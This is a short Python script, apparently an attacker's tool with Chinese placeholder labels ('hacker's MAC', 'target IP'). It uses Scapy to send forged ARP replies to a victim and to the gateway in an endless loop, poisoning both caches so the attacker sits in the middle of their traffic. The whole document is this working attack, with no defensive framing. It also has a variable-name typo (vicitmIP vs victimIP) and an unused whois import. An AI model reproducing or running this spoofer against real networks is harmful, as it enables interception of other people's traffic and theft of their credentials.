from scapy.all import *
import whois
import time
def main():
    getwayIP="[网关IP]"
    vicitmIP="[目标IP]"
    hackMAC="[黑客的网关]"
    victimMAC="[目标的网关]"
    getwayMAC="[网关的mac地址]"
    
    packet1=Ether(src=hackMAC,dst=victimMAC)/ARP(hwsrc=hackMAC,hwdst=victimMAC,psrc=getwayIP,pdst=victimIP,op=2)
    packet2=Ether(src=hackMAC,dst=getwayMAC)/ARP(hwsrc=hackMAC,hwdst=getwayMAC,psrc=victimIP,pdst=getwayIP,op=2)
    while 1:
        sendp(packet1,iface="eth0",verbose=False)
        sendp(packet2,iface="eth0",verbose=False)
        time.sleep(1)
        print(packet1.show())
        print(packet2.show())
    pass
if __name__ == '__main__':
    main()